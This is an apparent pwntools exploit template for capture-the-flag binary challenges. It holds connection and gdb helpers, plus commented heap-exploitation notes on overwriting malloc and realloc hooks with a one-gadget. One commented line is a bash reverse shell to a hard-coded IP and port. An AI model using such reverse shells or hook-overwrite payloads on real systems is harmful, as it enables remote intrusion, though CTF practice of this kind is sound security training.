#coding:utf-8
from pwn import *
import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x : p.recv(numb = x)
sa = lambda p, a,b : p.sendafter(a,b)
sla = lambda p, a,b : p.sendlineafter(a,b)

# amd64 or x86
context(arch = 'ARCH', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "FILENAME"
ip = "HOST"
port = PORT

LOCAL = True if len(sys.argv)==1 else False

global bps # break points
bps = []

elf = ELF(filename)

remote_libc = "remote_libc"
if LOCAL:
    io = process(filename)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process("./" + filename, env={'LD_PRELOAD': remote_libc}) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def mydebug(s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
                if type(break_point) == int:
                    b_str += "b *" + hex(break_point ) + '\n'
                elif type(break_point) == str:
                    b_str += "b * %s\n"%(break_point)
                else:
                    pause("unsupported break point type : "+str(break_point))
        return b_str
    if not LOCAL:
        return
    gdb.attach(io, _get_bstr()+s)

def pause(s = 'pause'):
    if LOCAL:
        print('pid: ' + str(io.pid))
        raw_input(s)
    else:
        raw_input(s)

def lg(name, val):
    log.info(name+" : "+hex(val))


pause()

# std_in_off = libc.symbols['_IO_2_1_stdin_']

# t = '''bash -c 'bash -i >& /dev/tcp/47.94.239.235/9981 0>&1'''

# '''0x3057 ^ 0x4f65 ^ 0xffff == 0x80cd'''
# _= libc.symbols['realloc']
# _= libc.symbols['__free_hook']


# use malloc to one gadget
# fake2 = libc.symbols['__malloc_hook'] - 0x23 # malloc hook 
# payload = "a"*19 + p64(one) 

# use reallochook
# payload = "a"*(19-8) + p64(one) + p64(libc.symbols['realloc'] + offset)

# <realloc>       push   r15
# <realloc+2>     push   r14
# <realloc+4>     push   r13
# <realloc+6>     push   r12
# <realloc+8>     mov    r13, rsi
# <realloc+11>    push   rbp
# <realloc+12>    push   rbx
# <realloc+13>    mov    rbx, rdi
# <realloc+16>    sub    rsp, 0x38
